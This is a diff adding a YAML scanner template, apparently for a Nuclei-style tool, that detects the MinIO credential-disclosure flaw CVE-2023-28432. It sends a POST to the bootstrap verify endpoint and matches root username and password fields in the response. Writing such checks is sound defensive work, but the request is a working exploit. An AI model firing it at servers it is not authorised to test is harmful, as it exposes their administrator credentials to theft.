@@ -1,0 +1,25 @@
+id: poc-yaml-minio-information-disclosure
+info:
+  name: MinIO Information Disclosure (CVE-2023-28432)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: cve, cve-2023-28432, information-disclosure, minio
+http:
+  - method: POST
+    path:
+      - "/minio/bootstrap/v1/verify"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"MINIO_ROOT_PASSWORD\":"
+          - "MINIO_ROOT_USER"
+          - "MinioEnv"
+        part: body
+        condition: and
+    stop-at-first-match: true
